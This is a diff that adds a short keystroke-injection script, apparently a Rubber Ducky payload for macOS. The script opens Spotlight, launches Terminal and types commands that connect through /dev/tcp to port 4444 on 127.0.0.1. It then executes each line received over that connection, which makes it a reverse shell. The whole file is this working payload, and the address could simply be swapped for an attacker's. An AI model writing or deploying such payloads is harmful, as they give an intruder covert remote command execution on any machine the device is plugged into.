@@ -1,0 +1,12 @@
+DELAY 1000
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING exec 5<>/dev/tcp/127.0.0.1/4444
+ENTER
+STRING cat <&5 | while read line; do $line 2>&5 >&5; done
+ENTER
+
